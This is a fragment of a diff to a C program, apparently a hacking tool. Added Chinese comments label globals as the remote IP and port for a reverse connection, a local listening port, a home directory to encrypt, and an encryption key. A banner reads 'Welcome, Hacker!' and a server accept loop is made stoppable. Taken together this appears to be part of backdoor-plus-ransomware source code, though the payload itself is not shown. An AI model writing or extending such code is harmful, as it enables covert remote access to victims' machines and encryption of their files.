@@ -27,10 +27,15 @@
 #define MAX_LEN (256)
 #define MAX_SIZE (4096)
 
+// 反向连接用到的远程ip
 char g_ip[MAX_LEN] = {"127.0.0.1"} ;
+// 反向剪径到的端口
 int g_port = 1234 ;
+// 本地监听的端口
 int g_listenport = 1234 ;
+// 本地要加密的目录
 char g_filepath[MAX_LEN] = {"~/"} ;
+// 加密的密钥
 char g_key = 0x2b ;
 
 const char Welcome[] = "Welcome, Hacker!\r\n" ;
@@ -79,7 +84,6 @@ int main(int argc, char **argv)
         printf("filepath: %s\r\n", g_filepath) ;
     }
 #else
-
     strcpy(g_filepath, "/Users/evilknight/document/testEntry") ;
     g_key = 12 ;
 #endif
@@ -102,8 +106,10 @@ int StartServer(void)
     struct sockaddr_in clnt_addr = {0};
     socklen_t clnt_addr_size = 0;
     char recv_buf[MAX_RECV] = {0} ;
+    int nContinue = 1 ;
 
     serv_sock = socket(PF_INET, SOCK_STREAM, 0);
+    
     if(serv_sock == -1)
         error_handling("StartServer socket() error");
 
@@ -119,7 +125,7 @@ int StartServer(void)
 
     printf("Server Start !\n");
 
-    while(1)
+    while(nContinue == 1)
     {
         pthread_t thread_id ;
         clnt_addr_size=sizeof(clnt_addr);  
